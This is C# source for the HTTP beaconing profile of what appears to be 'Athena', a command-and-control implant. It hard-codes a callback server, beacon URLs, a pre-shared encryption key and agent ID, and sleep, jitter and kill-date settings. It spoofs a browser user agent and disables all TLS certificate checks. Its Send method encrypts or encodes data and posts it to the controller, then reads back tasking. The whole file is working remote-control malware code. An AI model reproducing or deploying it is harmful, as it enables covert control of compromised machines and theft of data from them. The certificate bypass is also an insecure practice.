﻿using Athena.Models.Config;
using Athena.Utilities;
using Newtonsoft.Json;
using System.Net;
using System.Net.Security;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new HTTP();
        }
    }
    public class HTTP : IProfile
    {
        public string uuid { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        private HttpClient client { get; set; }

        public HTTP()
        {
            HttpClientHandler handler = new HttpClientHandler();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://192.168.4.201";
            string getUri = "index";
            string queryPath = "q";
            string postUri = "data";
            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
            this.hostHeader = "";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = "http://127.0.0.1:8080";
            this.proxyPass = "";
            this.proxyUser = "";
            this.psk = "FuG4oYroFMRzEcMgjULEJGt+XNbU/LH5TTgBVqjBgCw=";
            this.uuid = "80acafd9-6caf-43c9-917d-1a040b9d1030";
            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );


            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this.client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("false");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

        }
        public async Task<string> Send(object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                HttpResponseMessage response;
                if (json.Length < 2000) //Max URL length
                {
                    response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
                }
                else
                {
                    response = await this.client.PostAsync(this.postURL, new StringContent(json));
                }

                json = await response.Content.ReadAsStringAsync();

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    return (await Misc.Base64Decode(json)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
    }
}